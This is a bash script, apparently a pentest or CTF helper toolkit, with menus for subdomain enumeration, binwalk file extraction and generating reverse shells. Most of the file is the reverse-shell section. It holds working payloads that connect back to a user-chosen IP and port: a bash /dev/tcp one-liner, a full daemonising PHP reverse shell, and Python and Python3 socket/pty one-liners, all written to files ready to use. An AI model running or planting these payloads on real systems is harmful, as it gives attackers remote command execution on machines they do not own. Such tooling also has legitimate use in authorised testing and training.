#!/bin/env bash

# -----------------------------------------------------------------
#
#                             SUBDOMAINS
#
# -----------------------------------------------------------------

Subdomains(){
  TARGET=$(gum input --value "$TARGET" --placeholder "*.target.domain")

  gum spin --spinner dot --title "amass goes brrrr" -- amass enum -passive -d "$TARGET" | tee "/tmp/qkit/log/${DATE}_amass.txt"

  grep -oE '([a-zA-Z0-9]+\.)*[a-zA-Z0-9]+\.[a-zA-Z]{2,}' "/tmp/qkit/${DATE}_amass.txt" > "/tmp/qkit/log/${DATE}_domains.txt"

  cat "/tmp/qkit/log/${DATE}_domains.txt" | httprobe > "/tmp/qkit/log/${DATE}_realurls.txt"
}

# -----------------------------------------------------------------
#
#                             REVSHELLS
#
# -----------------------------------------------------------------

Revshells(){
  revshell=$(gum choose "SH" "PHP" "PY" "PY3")

  $revshell
}

# sh/bash
SH(){
  IP=$(gum input --value "$IP" --placeholder "Host IP")

  if [[ ! "$IP" =~ ^(([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))\.){3}([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))$ ]] ; then
    while [[ ! "$IP" =~ ^(([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))\.){3}([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))$ ]] ; do
      GUM_CONFIRM=false
      gum confirm "The IP address is incorrect. Do you want to enter it again" && \
      IP=$(gum input --value "$IP" --placeholder "Host IP") && \
      GUM_CONFIRM=true

      if [ "$GUM_CONFIRM" = false ] ; then
        exit 1
      fi
    done
  fi
  
  PORT=$(gum input --value "$PORT" --placeholder "Port")

  if [ ! -z "$PORT" ] || [ ! "$PORT" -lt 0 ] || [ ! "$PORT" -ge 65536 ]; then
    while [ -z "$PORT" ] || [ "$PORT" -lt 0 ] || [ "$PORT" -ge 65536 ]; do
      GUM_CONFIRM=false
      gum confirm "The Port number is incorrect. Do you want to enter it again?" && \
      PORT=$(gum input --value "$PORT" --placeholder "Port") && \
      GUM_CONFIRM=true
      
      if [ "$GUM_CONFIRM" = false ] ; then
        exit 1
      fi
    done
  fi

  RSHELL="sh -i >&/dev/tcp/${IP}/${PORT} 0>&1"

  gum pager "$RSHELL"
}

# php
PHP(){
  IP=$(gum input --value "$IP" --placeholder "Host IP")

  if [[ ! "$IP" =~ ^(([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))\.){3}([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))$ ]] ; then
    while [[ ! "$IP" =~ ^(([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))\.){3}([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))$ ]] ; do
      GUM_CONFIRM=false
      gum confirm "The IP address is incorrect. Do you want to enter it again" && \
      IP=$(gum input --value "$IP" --placeholder "Host IP") && \
      GUM_CONFIRM=true

      if [ "$GUM_CONFIRM" = false ] ; then
        exit 1
      fi
    done
  fi
  
  PORT=$(gum input --value "$PORT" --placeholder "Port")

  if [ ! -z "$PORT" ] || [ ! "$PORT" -lt 0 ] || [ ! "$PORT" -ge 65536 ]; then
    while [ -z "$PORT" ] || [ "$PORT" -lt 0 ] || [ "$PORT" -ge 65536 ]; do
      GUM_CONFIRM=false
      gum confirm "The Port number is incorrect. Do you want to enter it again?" && \
      PORT=$(gum input --value "$PORT" --placeholder "Port") && \
      GUM_CONFIRM=true
      
      if [ "$GUM_CONFIRM" = false ] ; then
        exit 1
      fi
    done
  fi

php_script=$(cat << 'EOF'
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = 'x.x.x.x';
$port = yyyy;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
        // Fork and have the parent process exit
        $pid = pcntl_fork();

        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }

        if ($pid) {
                exit(0);  // Parent exits
        }

        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }

        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}
chdir("/");
umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
printit("Successfully opened reverse shell to $ip:$port");
while (1) {
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }

        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }
        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }
        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }
        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}
?>
EOF
)

  echo "$php_script" | sed s/x.x.x.x/"${IP}"/g | sed s/yyyy/"${PORT}"/g > /tmp/qkit/reverse_shell.php

  gum style \
	--foreground 212 --border-foreground 212 --border double \
	--align center --width 50 --margin "1 2" --padding "2 4" \
	'/tmp/qkit/reverse_shell.php'
}

# Python
PY(){
  IP=$(gum input --value "$IP" --placeholder "Host IP")

  if [[ ! "$IP" =~ ^(([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))\.){3}([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))$ ]] ; then
    while [[ ! "$IP" =~ ^(([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))\.){3}([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))$ ]] ; do
      GUM_CONFIRM=false
      gum confirm "The IP address is incorrect. Do you want to enter it again" && \
      IP=$(gum input --value "$IP" --placeholder "Host IP") && \
      GUM_CONFIRM=true

      if [ "$GUM_CONFIRM" = false ] ; then
        exit 1
      fi
    done
  fi
  
  PORT=$(gum input --value "$PORT" --placeholder "Port")

  if [ ! -z "$PORT" ] || [ ! "$PORT" -lt 0 ] || [ ! "$PORT" -ge 65536 ]; then
    while [ -z "$PORT" ] || [ "$PORT" -lt 0 ] || [ "$PORT" -ge 65536 ]; do
      GUM_CONFIRM=false
      gum confirm "The Port number is incorrect. Do you want to enter it again?" && \
      PORT=$(gum input --value "$PORT" --placeholder "Port") && \
      GUM_CONFIRM=true
      
      if [ "$GUM_CONFIRM" = false ] ; then
        exit 1
      fi
    done
  fi

  
python_script=$(cat << 'EOF'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x",yyyy));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
EOF
)

  echo "$python_script" | sed s/x.x.x.x/"${IP}"/g | sed s/yyyy/"${PORT}"/g > /tmp/qkit/reverse_shell.py


  gum pager < /tmp/qkit/reverse_shell.py
}

PY3(){
  IP=$(gum input --value "$IP" --placeholder "Host IP")

  if [[ ! "$IP" =~ ^(([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))\.){3}([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))$ ]] ; then
    while [[ ! "$IP" =~ ^(([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))\.){3}([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))$ ]] ; do
      GUM_CONFIRM=false
      gum confirm "The IP address is incorrect. Do you want to enter it again" && \
      IP=$(gum input --value "$IP" --placeholder "Host IP") && \
      GUM_CONFIRM=true

      if [ "$GUM_CONFIRM" = false ] ; then
        exit 1
      fi
    done
  fi
  
  PORT=$(gum input --value "$PORT" --placeholder "Port")

  if [ ! -z "$PORT" ] || [ ! "$PORT" -lt 0 ] || [ ! "$PORT" -ge 65536 ]; then
    while [ -z "$PORT" ] || [ "$PORT" -lt 0 ] || [ "$PORT" -ge 65536 ]; do
      GUM_CONFIRM=false
      gum confirm "The Port number is incorrect. Do you want to enter it again?" && \
      PORT=$(gum input --value "$PORT" --placeholder "Port") && \
      GUM_CONFIRM=true
      
      if [ "$GUM_CONFIRM" = false ] ; then
        exit 1
      fi
    done
  fi

  
python_script=$(cat << 'EOF'
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x",yyyy));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
EOF
)

  echo "$python_script" | sed s/x.x.x.x/"${IP}"/g | sed s/yyyy/"${PORT}"/g > /tmp/qkit/reverse_shell.py


  gum pager < /tmp/qkit/reverse_shell.py
}


# -----------------------------------------------------------------
#
#                             FORENSICS
#
# -----------------------------------------------------------------

Binwalk(){ 

  FILE=$(gum file "$CWD")

  if [ -f "$FILE" ]; then
    binwalk "$FILE" > "/tmp/qkit/log/${DATE}_binwalk.txt"

    gum pager < "/tmp/qkit/log/${DATE}_binwalk.txt"
    gum confirm "Extract files?" && binwalk -e "$FILE" > /dev/null
  fi
}

# -----------------------------------------------------------------
#
#                             RUN
#
# -----------------------------------------------------------------

if [ ! -d "/tmp/qkit/log" ]; then
  mkdir -p /tmp/qkit/log
fi

CWD=$(pwd)

DATE=$(date)

run=$(gum choose "Subdomains" "Revshells" "Binwalk")

$run
